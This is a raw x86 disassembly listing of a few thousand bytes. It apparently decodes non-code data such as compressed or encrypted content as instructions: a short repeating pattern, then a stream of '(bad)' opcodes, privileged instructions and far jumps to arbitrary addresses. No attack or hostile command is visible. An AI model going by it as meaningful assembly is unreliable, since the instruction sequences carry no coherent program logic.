  423346:	or     BYTE PTR [esi],ah
  423348:	jle    0x423338
  42334a:	or     al,0x7b
  42334c:	pop    edx
  42334d:	inc    eax
  42334e:	(bad)  
  42334f:	fucomi st,st(1)
  423351:	xchg   edi,eax
  423352:	retf   
  423353:	or     BYTE PTR [esi],ah
  423355:	jle    0x423345
  423357:	or     al,0x7b
  423359:	pop    edx
  42335a:	inc    eax
  42335b:	(bad)  
  42335c:	fucomi st,st(1)
  42335e:	xchg   edi,eax
  42335f:	retf   
  423360:	or     BYTE PTR [esi],ah
  423362:	jle    0x423352
  423364:	or     al,0x7b
  423366:	pop    edx
  423367:	inc    eax
  423368:	(bad)  
  423369:	fucomi st,st(1)
  42336b:	xchg   edi,eax
  42336c:	retf   
  42336d:	or     BYTE PTR [esi],ah
  42336f:	jle    0x42335f
  423371:	or     al,0x7b
  423373:	pop    edx
  423374:	inc    eax
  423375:	(bad)  
  423376:	fucomi st,st(1)
  423378:	xchg   edi,eax
  423379:	retf   
  42337a:	or     BYTE PTR [esi],ah
  42337c:	jle    0x42336c
  42337e:	or     al,0x7b
  423380:	pop    edx
  423381:	inc    eax
  423382:	(bad)  
  423383:	fucomi st,st(1)
  423385:	xchg   edi,eax
  423386:	retf   
  423387:	or     BYTE PTR [esi],ah
  423389:	jle    0x423379
  42338b:	or     al,0x7b
  42338d:	pop    edx
  42338e:	inc    eax
  42338f:	(bad)  
  423390:	fucomi st,st(1)
  423392:	xchg   edi,eax
  423393:	retf   
  423394:	or     BYTE PTR [esi],ah
  423396:	jle    0x423386
  423398:	or     al,0x7b
  42339a:	pop    edx
  42339b:	inc    eax
  42339c:	(bad)  
  42339d:	fucomi st,st(1)
  42339f:	xchg   edi,eax
  4233a0:	retf   
  4233a1:	or     BYTE PTR [esi],ah
  4233a3:	jle    0x423393
  4233a5:	or     al,0x7b
  4233a7:	pop    edx
  4233a8:	inc    eax
  4233a9:	(bad)  
  4233aa:	fucomi st,st(1)
  4233ac:	xchg   edi,eax
  4233ad:	retf   
  4233ae:	or     BYTE PTR [esi],ah
  4233b0:	jle    0x4233a0
  4233b2:	or     al,0x7b
  4233b4:	pop    edx
  4233b5:	inc    eax
  4233b6:	(bad)  
  4233b7:	fucomi st,st(1)
  4233b9:	xchg   edi,eax
  4233ba:	retf   
  4233bb:	or     BYTE PTR [esi],ah
  4233bd:	jle    0x4233ad
  4233bf:	or     al,0x7b
  4233c1:	pop    edx
  4233c2:	inc    eax
  4233c3:	(bad)  
  4233c4:	fucomi st,st(1)
  4233c6:	xchg   edi,eax
  4233c7:	retf   
  4233c8:	or     BYTE PTR [esi],ah
  4233ca:	jle    0x4233ba
  4233cc:	or     al,0x7b
  4233ce:	pop    edx
  4233cf:	inc    eax
  4233d0:	(bad)  
  4233d1:	fucomi st,st(1)
  4233d3:	xchg   edi,eax
  4233d4:	retf   
  4233d5:	or     BYTE PTR [esi],ah
  4233d7:	jle    0x4233c7
  4233d9:	or     al,0x7b
  4233db:	pop    edx
  4233dc:	inc    eax
  4233dd:	(bad)  
  4233de:	fucomi st,st(1)
  4233e0:	xchg   edi,eax
  4233e1:	retf   
  4233e2:	or     BYTE PTR [esi],ah
  4233e4:	jle    0x4233d4
  4233e6:	or     al,0x7b
  4233e8:	pop    edx
  4233e9:	inc    eax
  4233ea:	(bad)  
  4233eb:	fucomi st,st(1)
  4233ed:	xchg   edi,eax
  4233ee:	retf   
  4233ef:	or     BYTE PTR [esi],ah
  4233f1:	jle    0x4233e1
  4233f3:	or     al,0x7b
  4233f5:	pop    edx
  4233f6:	inc    eax
  4233f7:	(bad)  
  4233f8:	fucomi st,st(1)
  4233fa:	xchg   edi,eax
  4233fb:	retf   
  4233fc:	or     BYTE PTR [esi],ah
  4233fe:	jle    0x4233ee
  423400:	or     al,0x7b
  423402:	pop    edx
  423403:	inc    eax
  423404:	(bad)  
  423405:	fucomi st,st(1)
  423407:	xchg   edi,eax
  423408:	retf   
  423409:	or     BYTE PTR [esi],ah
  42340b:	jle    0x4233fb
  42340d:	or     al,0x7b
  42340f:	pop    edx
  423410:	inc    eax
  423411:	(bad)  
  423412:	fucomi st,st(1)
  423414:	xchg   edi,eax
  423415:	retf   
  423416:	or     BYTE PTR [esi],ah
  423418:	jle    0x423408
  42341a:	or     al,0x7b
  42341c:	pop    edx
  42341d:	inc    eax
  42341e:	(bad)  
  42341f:	fucomi st,st(1)
  423421:	xchg   edi,eax
  423422:	retf   
  423423:	or     BYTE PTR [esi],ah
  423425:	jle    0x423415
  423427:	or     al,0x7b
  423429:	pop    edx
  42342a:	inc    eax
  42342b:	(bad)  
  42342c:	fucomi st,st(1)
  42342e:	xchg   edi,eax
  42342f:	retf   
  423430:	or     BYTE PTR [esi],ah
  423432:	jle    0x423422
  423434:	or     al,0x7b
  423436:	pop    edx
  423437:	inc    eax
  423438:	(bad)  
  423439:	fucomi st,st(1)
  42343b:	xchg   edi,eax
  42343c:	retf   
  42343d:	or     BYTE PTR [esi],ah
  42343f:	jle    0x42342f
  423441:	or     al,0x7b
  423443:	pop    edx
  423444:	inc    eax
  423445:	(bad)  
  423446:	fucomi st,st(1)
  423448:	xchg   edi,eax
  423449:	retf   
  42344a:	or     BYTE PTR [esi],ah
  42344c:	jle    0x42343c
  42344e:	or     al,0x7b
  423450:	pop    edx
  423451:	inc    eax
  423452:	(bad)  
  423453:	fucomi st,st(1)
  423455:	xchg   edi,eax
  423456:	retf   
  423457:	or     BYTE PTR [esi],ah
  423459:	jle    0x423449
  42345b:	or     al,0x7b
  42345d:	pop    edx
  42345e:	inc    eax
  42345f:	(bad)  
  423460:	fucomi st,st(1)
  423462:	xchg   edi,eax
  423463:	retf   
  423464:	or     BYTE PTR [esi],ah
  423466:	jle    0x423456
  423468:	or     al,0x7b
  42346a:	pop    edx
  42346b:	inc    eax
  42346c:	(bad)  
  42346d:	fucomi st,st(1)
  42346f:	xchg   edi,eax
  423470:	retf   
  423471:	or     BYTE PTR [esi],ah
  423473:	jle    0x423463
  423475:	or     al,0x7b
  423477:	pop    edx
  423478:	inc    eax
  423479:	(bad)  
  42347a:	fucomi st,st(1)
  42347c:	xchg   edi,eax
  42347d:	retf   
  42347e:	or     BYTE PTR [esi],ah
  423480:	jle    0x423470
  423482:	or     al,0x7b
  423484:	pop    edx
  423485:	inc    eax
  423486:	(bad)  
  423487:	fucomi st,st(1)
  423489:	xchg   edi,eax
  42348a:	retf   
  42348b:	or     BYTE PTR [esi],ah
  42348d:	jle    0x42347d
  42348f:	or     al,0x7b
  423491:	pop    edx
  423492:	inc    eax
  423493:	(bad)  
  423494:	fucomi st,st(1)
  423496:	xchg   edi,eax
  423497:	retf   
  423498:	or     BYTE PTR [ecx-0x70],ah
  42349b:	in     al,0xc
  42349d:	push   esp
  42349e:	pop    edx
  42349f:	inc    eax
  4234a0:	aam    0xdb
  4234a2:	jmp    0x58149e64
  4234a7:	sbb    BYTE PTR [ecx],dl
  4234a9:	and    ebp,esp
  4234ab:	fst    QWORD PTR [eax]
  4234ad:	sub    ebp,ebp
  4234af:	add    DWORD PTR [edi+edi*2+0x6a0f409d],eax
  4234b6:	push   esi
  4234b7:	push   0xb6d2f7eb
  4234bc:	or     eax,0x8ce4a1d
  4234c1:	sbb    al,0x7e
  4234c3:	xor    eax,DWORD PTR [edx+0x69]
  4234c6:	pcmpeqw mm1,mm4
  4234c9:	retf   
  4234ca:	xchg   edi,eax
  4234cb:	in     al,dx
  4234cc:	scas   eax,DWORD PTR es:[edi]
  4234cd:	scas   al,BYTE PTR es:[edi]
  4234ce:	sub    edi,DWORD PTR [edi+0x7d68d261]
  4234d4:	sbb    edi,ecx
  4234d6:	pop    eax
  4234d7:	neg    ebx
  4234d9:	push   ebx
  4234da:	add    BYTE PTR [edi+0x1],ch
  4234dd:	fidiv  DWORD PTR gs:[esi]
  4234e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234e1:	jle    0x4234da
  4234e3:	sbb    bl,BYTE PTR cs:[edi+0x230e10f6]
  4234ea:	xchg   ebp,eax
  4234eb:	jns    0x4234e7
  4234ed:	mov    eax,eax
  4234ef:	dec    esp
  4234f0:	nop
  4234f1:	test   al,0xd7
  4234f3:	jge    0x423530
  4234f5:	iret   
  4234f6:	inc    eax
  4234f7:	fneni(8087 only) 
  4234f9:	add    BYTE PTR [edi],0x8e
  4234fc:	xlat   BYTE PTR ds:[ebx]
  4234fd:	mov    al,ds:0xacb2a79a
  423502:	jae    0x4234aa
  423504:	repnz popf 
  423506:	lods   eax,DWORD PTR ds:[esi]
  423507:	jge    0x4234d7
  423509:	mov    esi,0x960821bf
  42350e:	out    0x1e,al
  423510:	cmp    BYTE PTR [edi+0x38],al
  423513:	mov    esi,0xa20b2da2
  423518:	adc    al,0x13
  42351a:	and    eax,DWORD PTR [esi-0x1a78fa86]
  423520:	push   ds
  423521:	mov    ds:0x90caa913,al
  423526:	out    0xdb,al
  423528:	neg    BYTE PTR [edi-0x75]
  42352b:	push   esi
  42352c:	xor    esp,DWORD PTR [ecx+edx*1+0x47]
  423530:	pop    ss
  423531:	stos   BYTE PTR es:[edi],al
  423532:	inc    ebx
  423533:	and    BYTE PTR [edx],cl
  423535:	into   
  423536:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423537:	and    al,0xce
  423539:	sub    esi,DWORD PTR [edi+0x66]
  42353c:	mov    ch,BYTE PTR [ebp-0x2e]
  42353f:	jmp    0x92be:0xfb99cb2f
  423546:	sbb    BYTE PTR [eax+0x6b],ch
  423549:	jne    0x423577
  42354b:	push   es
  42354c:	push   0x32
  42354e:	out    dx,eax
  42354f:	aad    0xf0
  423551:	and    eax,0x2a771356
  423556:	shl    BYTE PTR [ecx],0x67
  423559:	ror    BYTE PTR [ebp-0x70],1
  42355c:	sbb    al,0xe0
  42355e:	sbb    BYTE PTR ds:0x1149f3fd,al
  423564:	adc    eax,0xdc1b304a
  423569:	cmp    bl,bl
  42356b:	int3   
  42356c:	(bad)  
  42356d:	mov    ds:0xe9f07c81,eax
  423572:	add    eax,0x37677bf4
  423577:	pushf  
  423578:	repz ja 0x4235aa
  42357b:	mov    ss,WORD PTR [edx]
  42357d:	push   ebp
  42357e:	idiv   BYTE PTR [ecx-0x52]
  423581:	cdq    
  423582:	lahf   
  423583:	mov    ds:0xa0aa3db5,al
  423588:	sbb    eax,0x2d489f6b
  42358d:	and    eax,0xa594a039
  423592:	push   edx
  423593:	mov    ecx,cr7
  423596:	adc    edi,DWORD PTR [edi-0x23]
  423599:	push   0x459154d9
  42359e:	pusha  
  42359f:	xchg   ebx,eax
  4235a0:	pmuludq mm6,QWORD PTR [ecx-0x15]
  4235a4:	or     ebx,DWORD PTR [esi+0x4eada533]
  4235aa:	imul   ebx,ecx,0xac7d9bc5
  4235b0:	rcl    DWORD PTR [ebx],0x45
  4235b3:	ret    
  4235b4:	push   es
  4235b5:	pop    edx
  4235b6:	and    al,0xc
  4235b8:	cs stos DWORD PTR es:[edi],eax
  4235ba:	aaa    
  4235bb:	in     eax,0xb5
  4235bd:	push   edi
  4235be:	push   edi
  4235bf:	xor    eax,0xa0b2afa
  4235c4:	fimul  DWORD PTR [eax-0x4757978d]
  4235ca:	mov    cl,0xa0
  4235cc:	ret    0x7a50
  4235cf:	xor    cl,BYTE PTR [ebp+0x74]
  4235d2:	xchg   bh,dl
  4235d4:	jmp    0xb2aedb4a
  4235d9:	jmp    0x423577
  4235db:	jge    0x423607
  4235dd:	push   ecx
  4235de:	ror    DWORD PTR [eax+0x1a7cda2d],cl
  4235e4:	adc    ch,BYTE PTR [ebp-0x4d]
  4235e7:	sbb    DWORD PTR [ecx+0x3b3334c7],ebx
  4235ed:	inc    ebx
  4235ee:	jecxz  0x4235af
  4235f0:	iret   
  4235f1:	xchg   esi,eax
  4235f2:	(bad)
  4235f6:	ins    DWORD PTR es:[edi],dx
  4235f7:	stc    
  4235f8:	cwde   
  4235f9:	mov    edi,eax
  4235fb:	mov    esi,0x29d63eba
  423600:	js     0x42361a
  423602:	mov    eax,ds:0x2c9ee82e
  423607:	data16 arpl ax,cx
  42360a:	shr    DWORD PTR [edi+ecx*8+0x579ab669],0x1b
  423612:	xlat   BYTE PTR ds:[ebx]
  423613:	jmp    0x423686
  423615:	mov    bh,0x9d
  423617:	stos   DWORD PTR es:[edi],eax
  423618:	and    esp,0x9588dda5
  42361e:	xchg   edx,eax
  42361f:	sbb    dh,BYTE PTR [ebp+ecx*4+0x20]
  423623:	call   0x889a:0xe6a00af0
  42362a:	ss call 0x9e52:0x723433fc
  423632:	adc    dl,BYTE PTR [eax+0x64]
  423635:	xor    al,dh
  423637:	dec    esp
  423638:	rcl    esi,0x18
  42363b:	pop    ecx
  42363c:	cmc    
  42363d:	mov    cx,0x7981
  423641:	dec    esp
  423642:	mov    eax,ds:0xa33e63eb
  423647:	cdq    
  423648:	push   esp
  423649:	sbb    esp,ecx
  42364b:	dec    ecx
  42364c:	cs sbb eax,0x43f6c8c
  423652:	jae    0x423695
  423654:	push   edx
  423655:	out    dx,al
  423656:	stc    
  423657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423658:	hlt    
  423659:	sub    ch,dh
  42365b:	imul   ebx,DWORD PTR [edi],0x4d13a78
  423661:	rcr    BYTE PTR [esi-0x18167056],0xa
  423668:	jne    0x423637
  42366a:	pop    ebx
  42366b:	loopne 0x4235f0
  42366d:	cmp    bl,BYTE PTR [edx-0x27597b0c]
  423673:	jge    0x42366b
  423675:	sub    al,0xa0
  423677:	xor    al,dl
  423679:	pop    ss
  42367a:	sahf   
  42367b:	lahf   
  42367c:	lock jb 0x42360d
  42367f:	push   es
  423680:	repnz xor BYTE PTR [ebx+0x40],dl
  423684:	cdq    
  423685:	(bad)  
  423687:	(bad)  
  423688:	sub    dl,BYTE PTR [esi]
  42368a:	cmovno eax,DWORD PTR [edi+0x4b]
  42368e:	mov    esp,0x8f98864c
  423693:	inc    esi
  423694:	inc    eax
  423695:	imul   eax,DWORD PTR [edx+0x48788c84],0x18
  42369c:	xchg   dl,bl
  42369e:	outs   dx,BYTE PTR ds:[esi]
  42369f:	pop    ebp
  4236a0:	fs call 0x9441:0x401b2e62
  4236a8:	ins    BYTE PTR es:[edi],dx
  4236a9:	xor    BYTE PTR [esi+0x2],ch
  4236ac:	lea    edi,[ebp+0x4f]
  4236af:	fld    TBYTE PTR ds:0xbf776590
  4236b5:	or     edi,DWORD PTR [eax]
  4236b7:	ror    BYTE PTR [eax+0x6a],0xe7
  4236bb:	dec    esp
  4236bc:	lds    edi,FWORD PTR [edi]
  4236be:	hlt    
  4236bf:	stos   BYTE PTR es:[edi],al
  4236c0:	dec    esp
  4236c1:	ret    
  4236c2:	and    BYTE PTR [eax],dl
  4236c4:	sbb    BYTE PTR [edi],dh
  4236c6:	rcr    BYTE PTR [edx+ecx*2],1
  4236c9:	add    esp,DWORD PTR [edi-0x8a0cea6]
  4236cf:	jle    0x423687
  4236d1:	scas   al,BYTE PTR es:[edi]
  4236d2:	outs   dx,BYTE PTR ds:[esi]
  4236d3:	lea    edx,[edi+0x29]
  4236d6:	mov    bh,0x74
  4236d8:	or     ch,BYTE PTR [edx+0x25]
  4236db:	sub    al,0x60
  4236dd:	mov    bh,0x21
  4236df:	adc    eax,0x65efa297
  4236e4:	pop    edx
  4236e5:	dec    eax
  4236e6:	sub    bl,ch
  4236e8:	push   cs
  4236e9:	das    
  4236ea:	add    DWORD PTR [esi-0x4fa22a6],ecx
  4236f0:	clc    
  4236f1:	in     eax,dx
  4236f2:	add    BYTE PTR [esi-0xbf2edcc],0xc8
  4236f9:	jmp    0xf19b:0x9d976df6
  423700:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423701:	loop   0x4236d3
  423703:	pop    eax
  423704:	dec    ecx
  423705:	xor    al,0x2a
  423707:	ret    0x1b34
  42370a:	mov    esp,0xa4a6ed47
  42370f:	sub    eax,DWORD PTR [edi]
  423711:	mov    ds,WORD PTR [esi+edx*4]
  423714:	not    DWORD PTR [ecx-0x147fb9f4]
  42371a:	or     ecx,ecx
  42371c:	stos   DWORD PTR es:[edi],eax
  42371d:	daa    
  42371e:	retf   
  42371f:	aad    0x52
  423721:	out    0xe2,al
  423723:	pop    ebp
  423724:	xchg   esi,eax
  423725:	jecxz  0x4236bb
  423727:	or     al,0x32
  423729:	fst    DWORD PTR [eax+0x5dd5c2d7]
  42372f:	xor    eax,0x9915840f
  423734:	dec    edx
  423735:	push   cs
  423736:	popf   
  423737:	loope  0x4236e3
  423739:	jl     0x4236c1
  42373b:	outs   dx,BYTE PTR ds:[esi]
  42373c:	xor    eax,esp
  42373e:	nop
  42373f:	mul    BYTE PTR [ebx+0x4ad986bd]
  423745:	aas    
  423746:	adc    edx,DWORD PTR [ebx]
  423748:	sbb    al,0x13
  42374a:	adc    ch,BYTE PTR [edx-0x73]
  42374d:	test   al,0x80
  42374f:	in     al,0xec
  423751:	aam    0x4a
  423753:	push   edx
  423754:	inc    esp
  423755:	cs jle 0x423797
  423758:	popf   
  423759:	jg     0x42373c
  42375b:	jo     0x4237ce
  42375d:	enter  0x2e72,0x1b
  423761:	lock test eax,0x394c46e2
  423767:	xchg   edi,eax
  423768:	(bad)  
  423769:	mov    esi,0x4293086a
  42376e:	sbb    al,0xec
  423770:	or     bl,BYTE PTR [edx-0x3a09cc5]
  423776:	icebp  
  423777:	add    bh,bl
  423779:	jns    0x423799
  42377b:	cwde   
  42377c:	inc    esp
  42377d:	cmp    al,BYTE PTR gs:[edi+0x1616f44d]
  423784:	mov    ch,0x34
  423786:	xchg   DWORD PTR [esi],edi
  423788:	pop    ebx
  423789:	ins    BYTE PTR es:[edi],dx
  42378a:	or     al,0x39
  42378d:	and    dh,BYTE PTR [eax]
  42378f:	scas   al,BYTE PTR es:[edi]
  423790:	adc    DWORD PTR [esi+0x55],ebp
  423793:	mov    BYTE PTR [ebx-0x2add6d7e],dh
  423799:	fisub  WORD PTR [ebp+0x77]
  42379c:	leave  
  42379d:	pop    ebp
  42379e:	cmp    ch,BYTE PTR [edx+0x72]
  4237a1:	lahf   
  4237a2:	adc    DWORD PTR [ecx+edx*2-0x57],eax
  4237a6:	adc    al,0xd7
  4237a8:	add    edx,edi
  4237aa:	xchg   DWORD PTR [edx-0x2c],eax
  4237ad:	int    0x25
  4237af:	pop    ss
  4237b0:	sub    esp,DWORD PTR [ecx+0x7f]
  4237b3:	fnsave [edx+0x1774008e]
  4237b9:	sub    esi,edx
  4237bb:	pop    esi
  4237bc:	fstp   DWORD PTR [eax+ecx*2+0x5e]
  4237c0:	(bad)  
  4237c1:	adc    al,0x4b
  4237c3:	outs   dx,DWORD PTR ds:[esi]
  4237c4:	pop    edx
  4237c5:	sub    al,0x47
  4237c7:	xlat   BYTE PTR ds:[ebx]
  4237c8:	sbb    bh,BYTE PTR [edi]
  4237ca:	jne    0x423820
  4237cc:	or     BYTE PTR [eax+0x14],bl
  4237cf:	xchg   esp,eax
  4237d0:	xor    dl,al
  4237d2:	cld    
  4237d3:	(bad)  ds:0xadeb910b
  4237d9:	mov    esi,0xd30a558e
  4237de:	aad    0xb6
  4237e0:	pushf  
  4237e1:	std    
  4237e2:	push   cs
  4237e3:	test   dl,bh
  4237e5:	es jmp 0xb86ed387
  4237eb:	fwait
  4237ec:	adc    esp,DWORD PTR [ebp-0x14]
  4237ef:	lock (bad) 
  4237f1:	adc    bl,dh
  4237f3:	fisubr WORD PTR [ebp+0x7e]
  4237f6:	(bad)  
  4237f7:	cs pop ss
  4237f9:	pop    esi
  4237fa:	push   ebx
  4237fb:	(bad)  
  4237fc:	adc    BYTE PTR es:[esp+eax*4-0x61caaa38],al
  423804:	call   0x49fc:0xf373564b
  42380b:	jno    0x4237c3
  42380d:	lods   eax,DWORD PTR ds:[esi]
  42380e:	push   cs
  42380f:	dec    ebx
  423810:	shl    DWORD PTR ds:0x59dc761b,1
  423816:	and    ah,BYTE PTR [edi+esi*4]
  423819:	in     eax,dx
  42381a:	sbb    BYTE PTR [edi],0x16
  42381d:	ins    DWORD PTR es:[edi],dx
  42381e:	xlat   BYTE PTR ds:[ebx]
  42381f:	js     0x42382a
  423821:	sbb    DWORD PTR ds:0x2d12a4b4,ebx
  423827:	xchg   bp,ax
  423829:	jl     0x42387c
  42382b:	mov    ebx,0xf42e9eec
  423830:	out    dx,eax
  423831:	ffree  st(7)
  423833:	push   0xffffffc9
  423835:	das    
  423836:	outs   dx,BYTE PTR ds:[esi]
  423837:	sbb    esi,DWORD PTR [ebp-0x26]
  42383a:	cmp    BYTE PTR cs:[edx+eiz*8-0x7c123481],cl
  423842:	xor    BYTE PTR [esp+edi*1],dl
  423845:	jp     0x4237d3
  423847:	or     al,0x2
  423849:	cmp    al,0x30
  42384b:	loop   0x4238c9
  42384d:	neg    DWORD PTR ds:0x325eb47c
  423853:	jae    0x423874
  423855:	xor    eax,0x4c35b0d0
  42385a:	sub    esi,DWORD PTR [edx-0x7e3e3192]
  423860:	xchg   edi,eax
  423861:	or     eax,0x6718bcb
  423866:	add    ah,ch
  423868:	fisttp QWORD PTR [edx-0x38bc0644]
  42386e:	push   ebx
  42386f:	mov    ecx,tr1
  423872:	and    eax,DWORD PTR [edx]
  423874:	mov    ds:0x44f828ee,eax
  423879:	jae    0x423877
  42387b:	push   cs
  42387c:	push   0x87dd9a0b
  423881:	cmc    
  423882:	pop    edx
  423883:	daa    
  423884:	xor    eax,0x5e2049f9
  423889:	sbb    eax,0xdf7bbff5
  42388e:	nop
  42388f:	out    dx,al
  423890:	push   cs
  423891:	fucomi st,st(7)
  423893:	test   BYTE PTR [ecx],ah
  423895:	mov    esi,0xd280e28a
  42389a:	xchg   BYTE PTR [eax-0x50665ce],bh
  4238a0:	addr16 push 0x44785be4
  4238a6:	rol    BYTE PTR [eax+0xf],cl
  4238a9:	adc    esi,DWORD PTR [ebx+0x55d0fa30]
  4238af:	jbe    0x4238ef
  4238b1:	dec    esp
  4238b2:	ins    BYTE PTR es:[edi],dx
  4238b3:	xor    DWORD PTR [ecx+eax*4],ecx
  4238b6:	sub    eax,0x2f5cffef
  4238bb:	outs   dx,BYTE PTR ds:[esi]
  4238bc:	sub    BYTE PTR cs:[edx],0x9f
  4238c0:	sbb    al,0x5d
  4238c2:	loope  0x42388c
  4238c4:	inc    eax
  4238c5:	sbb    edi,DWORD PTR ds:0xf839e677
  4238cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238cc:	mov    BYTE PTR [ecx-0x39],dh
  4238cf:	mov    ah,BYTE PTR [ecx]
  4238d1:	and    edx,esi
  4238d3:	lock pop edi
  4238d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238d6:	add    ebx,DWORD PTR [ebx-0x560b8eae]
  4238dc:	cli    
  4238dd:	or     eax,0xb92e7b65
  4238e2:	jne    0x4238eb
  4238e4:	mov    ecx,0x7908ccbf
  4238e9:	mov    cl,0xd2
  4238eb:	and    al,0x20
  4238ed:	and    eax,0xc705d27c
  4238f2:	imul   edx,DWORD PTR [ebp+0x73],0x0
  4238f6:	jmp    0xdc5bbece
  4238fb:	jo     0x4238da
  4238fd:	out    0x76,eax
  4238ff:	cmp    BYTE PTR gs:[ecx-0x70],al
  423903:	lods   al,BYTE PTR ds:[esi]
  423904:	pushf  
  423905:	mov    cl,dh
  423907:	mov    es,WORD PTR [esi-0x6e]
  42390a:	ss sbb al,0x60
  42390d:	sti    
  42390e:	push   ebp
  42390f:	leave  
  423910:	or     BYTE PTR [esi-0x2],bh
  423913:	push   0x1bf3da1b
  423918:	jmp    0x4238bc
  42391a:	scas   al,BYTE PTR es:[edi]
  42391b:	test   al,0x61
  42391d:	adc    edi,eax
  42391f:	adc    esi,DWORD PTR [ebx]
  423921:	cmp    esi,DWORD PTR [eax-0x2040028e]
  423927:	inc    ebx
  423928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42392a:	xchg   edi,eax
  42392b:	xor    ch,BYTE PTR [esi+0x63]
  42392e:	test   BYTE PTR [ebp-0x70],ch
  423931:	pop    ebp
  423932:	jnp    0x4238c0
  423934:	call   0xb86aaeef
  423939:	(bad)  [ebx-0x339e3333]
  42393f:	mov    al,0x44
  423941:	in     eax,0xcc
  423943:	cmc    
  423944:	je     0x4239c0
  423946:	mov    esi,0x15a88b58
  42394b:	kmovw  WORD PTR [esi+0x5b],k2
  423950:	or     bh,BYTE PTR [ebp+eiz*8+0x347e6afc]
  423957:	mov    edi,0xa56dc770
  42395c:	jecxz  0x4239b5
  42395e:	jb     0x423968
  423960:	or     eax,DWORD PTR [eax+0x39]
  423963:	cmp    edx,DWORD PTR [edx]
  423965:	pop    esi
  423966:	mov    ch,cl
  423968:	(bad)
  42396b:	sti    
  42396c:	ss iret 
  42396e:	leave  
  42396f:	mov    esp,0x5dfbd90c
  423974:	mov    eax,ds:0x9c107dfe
  423979:	in     al,dx
  42397a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397b:	je     0x4239e4
  42397d:	dec    BYTE PTR [edi-0x5e]
  423980:	std    
  423981:	scas   eax,DWORD PTR es:[edi]
  423982:	xchg   ebx,eax
  423983:	cmc    
  423984:	inc    ecx
  423985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423986:	aaa    
  423987:	call   0x11fa369c
  42398c:	sub    al,0x91
  42398e:	cmp    BYTE PTR [edx],bh
  423990:	fimul  WORD PTR [ecx+0x5d]
  423993:	jmp    0x42396c
  423995:	and    eax,DWORD PTR [edx-0x2dc12004]
  42399b:	cmp    edx,DWORD PTR [edx-0x11]
  42399e:	sar    BYTE PTR [ecx+0x6c],0xc9
  4239a2:	dec    ebp
  4239a3:	cmp    ecx,esp
  4239a5:	pop    edi
  4239a6:	jb     0x4239e3
  4239a8:	push   ecx
  4239a9:	mov    cl,0xc3
  4239ab:	mov    al,ds:0xd577c572
  4239b0:	out    0xeb,al
  4239b2:	inc    DWORD PTR [ebx-0x1c]
  4239b5:	jp     0x42395e
  4239b7:	push   ss
  4239b8:	arpl   WORD PTR [ebp-0x78],ax
  4239bb:	add    al,0xa0
  4239bd:	mov    cl,0x9b
  4239bf:	pop    edx
  4239c0:	outs   dx,DWORD PTR ds:[esi]
  4239c1:	lods   al,BYTE PTR ds:[esi]
  4239c2:	rcl    DWORD PTR [ecx-0x42],1
  4239c5:	dec    esp
  4239c6:	dec    edx
  4239c7:	out    dx,al
  4239c8:	cmp    BYTE PTR [edx],bl
  4239ca:	int3   
  4239cb:	in     eax,0x86
  4239cd:	mov    ah,BYTE PTR [esi+0x6fad2040]
  4239d3:	rol    DWORD PTR [esi-0x66256afc],1
  4239d9:	cmc    
  4239da:	xor    edx,DWORD PTR [edi]
  4239dc:	mov    bl,0xa6
  4239de:	ja     0x423a39
  4239e0:	cwde   
  4239e1:	mov    al,0x58
  4239e3:	mov    eax,ds:0xe5eaeb43
  4239e8:	imul   esp,DWORD PTR [ebx+0x58],0xffffffa5
  4239ec:	adc    edi,DWORD PTR [eax]
  4239ee:	xor    BYTE PTR [esi+0x145928a2],dh
  4239f4:	push   0x41
  4239f6:	pusha  
  4239f7:	outs   dx,BYTE PTR ds:[esi]
  4239f8:	sbb    esi,0x5b81fccb
  4239fe:	add    edi,0xffffffe9
  423a01:	push   ss
  423a02:	in     al,0x37
  423a04:	jno    0x4239bd
  423a06:	data16 or cl,BYTE PTR [ebp+0x7d40c7a]
  423a0d:	mov    edi,0x591e4f5b
  423a12:	mov    ch,0xa6
  423a14:	cmc    
  423a15:	in     eax,dx
  423a16:	repz inc eax
  423a18:	inc    esp
  423a19:	mov    BYTE PTR [ebp-0x3d],bl
  423a1c:	inc    esp
  423a1d:	jo     0x423a85
  423a1f:	pop    ebp
  423a20:	inc    edi
  423a21:	xchg   ecx,eax
  423a22:	test   DWORD PTR [edi-0x747c426],0x951c7e20
  423a2c:	pop    ebp
  423a2d:	dec    edi
  423a2e:	sbb    DWORD PTR [edx],ecx
  423a30:	sbb    ch,0x96
  423a33:	xchg   ecx,eax
  423a34:	push   0x61c3751e
  423a39:	test   DWORD PTR [eax],esi
  423a3b:	mov    ah,0x12
  423a3d:	xor    dl,BYTE PTR [ebp+0x43609da3]
  423a43:	mov    ds:0xc496ccb5,al
  423a48:	aas    
  423a49:	bnd jg 0x423a0d
  423a4c:	mov    dl,BYTE PTR [eax+0x50dc29b4]
  423a52:	or     DWORD PTR [ecx-0x43fb98d1],edx
  423a58:	clc    
  423a59:	adc    al,dh
  423a5b:	xor    eax,0xa792058
  423a60:	sub    eax,0x20a5c7ed
  423a65:	lods   al,BYTE PTR ds:[esi]
  423a66:	push   cs
  423a67:	cld    
  423a68:	js     0x423a3e
  423a6a:	fsubr  DWORD PTR [esi-0x2ba64abd]
  423a70:	inc    ecx
  423a71:	jge    0x423a4e
  423a73:	add    bl,0xef
  423a76:	jg     0x423ac0
  423a78:	ret    0x6799
  423a7b:	(bad)  
  423a7d:	push   esi
  423a7e:	loop   0x423aad
  423a80:	ja     0x423ac0
  423a82:	jae    0x423a47
  423a84:	cli    
  423a85:	sbb    DWORD PTR [eax+0x47],0xffffffe5
  423a89:	push   esi
  423a8a:	push   edi
  423a8b:	push   esp
  423a8c:	daa    
  423a8d:	or     eax,0xb71ffd5
  423a92:	sbb    ebp,DWORD PTR [edx]
  423a94:	fnstenv [ebx+0x7e]
  423a97:	std    
  423a98:	or     al,dl
  423a9a:	inc    edx
  423a9c:	inc    ebx
  423a9d:	mov    ds:0x179f9be5,eax
  423aa2:	add    eax,0x45d08c22
  423aa7:	shl    DWORD PTR [ecx-0x76852048],1
